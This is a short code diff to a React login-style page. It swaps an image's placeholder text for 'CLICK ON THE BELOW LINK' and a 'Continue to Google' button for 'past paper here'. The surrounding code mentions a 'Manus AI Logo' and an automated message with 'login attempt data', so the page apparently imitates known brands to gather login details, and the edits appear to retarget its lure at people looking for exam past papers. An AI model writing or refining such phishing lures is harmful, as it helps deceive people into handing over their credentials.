@@ -59,7 +59,7 @@ This is an automated message with login attempt data.`,
           {/* Manus AI Logo */}
           <div className="mb-8">
             <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=THANK YOU" 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=CLICK ON THE BELOW LINK" 
               alt="Manus AI Logo" 
               className="w-48 h-auto mx-auto"
             />
@@ -76,7 +76,7 @@ This is an automated message with login attempt data.`,
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
-              Continue to Google
+              past paper here
             </button>
           </div>
         </div>
